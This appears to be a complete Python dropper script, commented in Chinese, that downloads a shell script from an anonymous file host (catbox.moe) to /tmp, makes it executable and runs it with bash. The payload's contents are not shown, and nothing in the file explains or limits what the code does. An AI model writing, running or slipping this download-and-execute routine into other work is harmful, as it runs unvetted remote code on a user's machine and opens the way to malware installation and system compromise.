import subprocess
import os

# 定义下载和执行脚本的函数
def download_and_run_script():
    script_url = "https://files.catbox.moe/uh19yg.sh"
    script_path = "/tmp/uh19yg.sh"

    # 下载脚本
    try:
        subprocess.run(['curl', '-o', script_path, script_url], check=True)
        # 修改文件权限
        os.chmod(script_path, 0o755)
        print("脚本下载成功，权限已设置为 0755。")
    except subprocess.CalledProcessError as e:
        print(f"下载脚本时出错: {e}")
        return

    # 运行脚本
    try:
        result = subprocess.run(['bash', script_path], check=True, capture_output=True, text=True)
        print("脚本输出:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"运行脚本时出错: {e}")
        print(e.stderr)

# 执行函数
if __name__ == "__main__":
    download_and_run_script()
